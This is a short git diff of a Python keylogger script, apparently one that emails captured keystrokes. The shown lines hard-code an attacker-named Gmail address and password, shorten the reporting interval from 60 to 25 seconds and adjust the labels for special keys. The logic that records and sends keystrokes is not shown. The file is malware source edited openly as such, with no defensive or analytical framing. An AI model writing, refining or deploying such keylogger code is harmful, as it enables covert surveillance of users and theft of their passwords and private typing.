@@ -4,7 +4,7 @@ import keyboard
 import smtplib
 from threading import Timer
 from datetime import datetime
-INTERVAL = 60
+INTERVAL = 25
 EMAIL_ADDRESS= "fsattacker247@gmail.com"
 EMAIL_PASSWORD ="FS123456789"
 
@@ -22,7 +22,7 @@ class Keylogger:
             if name== "space":
                 name = "<SPACE>"
             elif name == "enter":
-                name ="<Enter>"
+                name ="<ENTER>"
             elif name == "backspace":
                 name ="<BACKSPACE>"
             elif name == "tab":
